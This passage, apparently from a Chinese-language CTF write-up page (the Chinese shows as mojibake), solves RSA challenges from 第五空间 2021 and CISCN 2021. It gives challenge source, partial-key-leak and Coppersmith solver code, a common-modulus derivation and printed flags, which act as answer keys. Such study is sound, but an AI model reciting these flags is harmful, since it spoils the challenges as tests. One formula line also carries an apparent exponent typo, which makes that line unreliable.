class="hljs-comment">#b&#x27;flag&#123;f8d8bfa5-6c7f-14cb-908b-abc1e96946c6&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;f8d8bfa5-6c7f-14cb-908b-abc1e96946c6&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬äº”ç©ºé—´-2021signin"><a class="markdownIt-Anchor" href="#ç¬¬äº”ç©ºé—´-2021signin"></a> [ç¬¬äº”ç©ºé—´ 2021]signin</h1><h2 id="é¢˜ç›®-14"><a class="markdownIt-Anchor" href="#é¢˜ç›®-14"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">0x10001</span><br>x = (p ^ q) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">400</span>) - <span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span> + <span class="hljs-built_in">str</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = &quot;</span> + <span class="hljs-built_in">str</span>(e))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span> + <span class="hljs-built_in">str</span>(n))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = &quot;</span> + <span class="hljs-built_in">str</span>(x))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 86415476382906786465939442398992406348852252355326334785583474583480585659663836032856765037225261433532613020730103955916772373674295180495452293421279237222544308971840820110279355118064931506637793547489441433938707518241461449059717326341918746156620038847745542794560335988858156929013492541794032580255</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">n = 166337085427556441543394334802135957169988266794453522153008810336368247289697353242192853337017363111987395194428553050681210209730724596529629525357502302165396675392000087988956194589350195512264427901330860811469484473725396354231555692283910488095918243519370430703255279433498479943391876108577325840381</span><br><span class="hljs-string">x = 2509898544460604898497702985357222191225421344430742181152035006910161802193623236888758239071502008180363546424715261788</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-14"><a class="markdownIt-Anchor" href="#åˆ†æ-14"></a> åˆ†æ</h2><p>è¿›é˜¶ç‰ˆçš„på¼‚æˆ–q</p><p>åªç»™äº†på’Œqçš„ä½400ä½</p><p>åˆ©ç”¨dfså‰ªæè®¡ç®—å¯èƒ½çš„på’Œq</p><p>ç„¶åcoppersmithè®¡ç®—på’Œq</p><p>(å…·ä½“åŸç†æˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œå¯ä»¥å½“ä½œæ¿å­é¢˜æŠŠï¼Œç›´æ¥æ‹¿xennyå¸ˆå‚…çš„wpäº†)</p><p>(æ³¨æ„ç‚¹ï¼Œsageç¯å¢ƒä¸­å¼‚æˆ–æ˜¯^^)</p><h2 id="exp-14"><a class="markdownIt-Anchor" href="#exp-14"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-number">86415476382906786465939442398992406348852252355326334785583474583480585659663836032856765037225261433532613020730103955916772373674295180495452293421279237222544308971840820110279355118064931506637793547489441433938707518241461449059717326341918746156620038847745542794560335988858156929013492541794032580255</span><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">166337085427556441543394334802135957169988266794453522153008810336368247289697353242192853337017363111987395194428553050681210209730724596529629525357502302165396675392000087988956194589350195512264427901330860811469484473725396354231555692283910488095918243519370430703255279433498479943391876108577325840381</span><br>x = <span class="hljs-number">2509898544460604898497702985357222191225421344430742181152035006910161802193623236888758239071502008180363546424715261788</span><br><br>plist = [<span class="hljs-number">0</span>]<br>qlist = [<span class="hljs-number">0</span>]<br><br>mask = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>    tmpp, tmpq = [],[]<br>    <span class="hljs-keyword">for</span> p,q <span class="hljs-keyword">in</span> [(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)]:<br>        <span class="hljs-keyword">if</span> p^^q == ((x&gt;&gt;mask)&amp;<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plist)):<br>                <span class="hljs-keyword">if</span> ((p&lt;&lt;mask) + plist[j]) * ((q&lt;&lt;mask) + qlist[j]) % (<span class="hljs-number">2</span>&lt;&lt;mask) == n % (<span class="hljs-number">2</span>&lt;&lt;mask):<br>                    tmpp.append((p&lt;&lt;mask) + plist[j])<br>                    tmpq.append((q&lt;&lt;mask) + qlist[j])<br>    plist,qlist = tmpp, tmpq<br>    mask += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> pbar <span class="hljs-keyword">in</span> plist:<br>    PR = PolynomialRing(Zmod(n), <span class="hljs-string">&#x27;x&#x27;</span>)<br>    x = PR(<span class="hljs-string">&#x27;x&#x27;</span>)<br>    ZmodN = Zmod(n)<br>    f = x*ZmodN(<span class="hljs-number">2</span>**<span class="hljs-number">400</span>) + pbar<br>    f = f.monic()<br>    r = f.small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">112</span>, beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> r:<br>        p = <span class="hljs-built_in">int</span>(pbar+r[<span class="hljs-number">0</span>]* <span class="hljs-number">2</span>**<span class="hljs-number">400</span>)<br>        <span class="hljs-keyword">if</span> n%p == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br><br>q = n // p<br>d = inverse_mod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(power_mod(c, d, n)))<br><span class="hljs-comment">#b&#x27;flag&#123;59sm5gzl-8wbm-v2lj-w7m2-4op2lyr8wjz8&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;59sm5gzl-8wbm-v2lj-w7m2-4op2lyr8wjz8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ciscn-2021åˆèµ›rsa"><a class="markdownIt-Anchor" href="#ciscn-2021åˆèµ›rsa"></a> [CISCN 2021åˆèµ›]rsa</h1><h2 id="é¢˜ç›®-15"><a class="markdownIt-Anchor" href="#é¢˜ç›®-15"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> text,flag<br><span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long,getPrime<br><br><span class="hljs-keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>]<br><br>msg1 = text[:xx]<br>msg2 = text[xx:yy]<br>msg3 = text[yy:]<br><br>msg1 = bytes_to_long(msg1)<br>msg2 = bytes_to_long(msg2)<br>msg3 = bytes_to_long(msg3)<br><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q1 = getPrime(<span class="hljs-number">512</span>)<br>N1 = p1*q1<br>e1 = <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg1,e1,N1)<br><span class="hljs-built_in">print</span> (e1,N1)<br><br>p2 = getPrime(<span class="hljs-number">512</span>)<br>q2 = getPrime(<span class="hljs-number">512</span>)<br>N2 = p2*q2<br>e2 = <span class="hljs-number">17</span><br>e3 = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg2,e2,N2)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg2,e3,N2)<br><span class="hljs-built_in">print</span> (e2,N2)<br><span class="hljs-built_in">print</span> (e3,N2)<br><br>p3 = getPrime(<span class="hljs-number">512</span>)<br>q3 = getPrime(<span class="hljs-number">512</span>)<br>N3 = p3*q3<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg3,e3,N3)<br><span class="hljs-built_in">print</span> (e3,N3)<br><span class="hljs-built_in">print</span> p3&gt;&gt;<span class="hljs-number">200</span><br><br><br><span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br>(<span class="hljs-number">3</span>, <span class="hljs-number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L</span>)<br><span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>(<span class="hljs-number">17</span>, <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span>)<br>(<span class="hljs-number">65537</span>, <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span>)<br><span class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>(<span class="hljs-number">65537</span>, <span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span>)<br><span class="hljs-number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-15"><a class="markdownIt-Anchor" href="#åˆ†æ-15"></a> åˆ†æ</h2><p>å°†textåˆ†æˆäº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œæœ€åè®¡ç®—textçš„md5å€¼ä½œä¸ºflag</p><h3 id="ç¬¬ä¸€éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€éƒ¨åˆ†"></a> ç¬¬ä¸€éƒ¨åˆ†</h3><p>eè¾ƒå°ï¼Œä¸”æ¨æµ‹mä¹Ÿè¾ƒå°ï¼Œå¯ä»¥ç›´æ¥å¼€æ ¹</p><h3 id="ç¬¬äºŒéƒ¨åˆ†"><a class="markdownIt-Anchor" href="#ç¬¬äºŒéƒ¨åˆ†"></a> ç¬¬äºŒéƒ¨åˆ†</h3><p>ä½¿ç”¨äº†ä¸¤ä¸ªeè¿›è¡ŒåŠ å¯†ï¼Œä¸”ä¸¤ä¸ªeäº’ç´ </p><p>æœ‰ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>m</mi><msub><mi>e</mi><mn>3</mn></msub></msup><mo>=</mo><msub><mi>c</mi><mn>3</mn></msub><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">m^{e_2}=c_2\quad mod(n)\\m^{e_3}=c_3\quad mod(n)\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span></span></span></span></p><p>åˆ©ç”¨æ‰©å±•æ¬§åŸºé‡Œå¾·è®¡ç®—ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>e</mi><mn>2</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>e</mi><mn>3</mn></msub><mo>=</mo><mn>1</mn><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><msup><mo stretchy="false">)</mo><msub><mi>s</mi><mn>1</mn></msub></msup><mo>âˆ—</mo><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>3</mn></msub></msup><msup><mo stretchy="false">)</mo><msub><mi>s</mi><mn>2</mn></msub></msup><mo>=</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>s</mi><mn>1</mn></msub></msubsup><mo>âˆ—</mo><msubsup><mi>c</mi><mn>3</mn><msub><mi>s</mi><mn>2</mn></msub></msubsup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>s</mi><mn>1</mn></msub><mo>+</mo><mi>e</mi><mn>3</mn><mo>âˆ—</mo><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>=</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>s</mi><mn>1</mn></msub></msubsup><mo>âˆ—</mo><msubsup><mi>c</mi><mn>3</mn><msub><mi>s</mi><mn>2</mn></msub></msubsup><mo>=</mo><mi>m</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s_1*e_2+s_2*e_3=1\\(m^{e_2})^{s_1}*(m^{e_3})^{s_2}=c_2^{s_1}*c_3^{s_2}\quad mod(n)\\m^{e_2*s_1+e3*e_2}=c_2^{s_1}*c_3^{s_2}=m\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.016308em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing 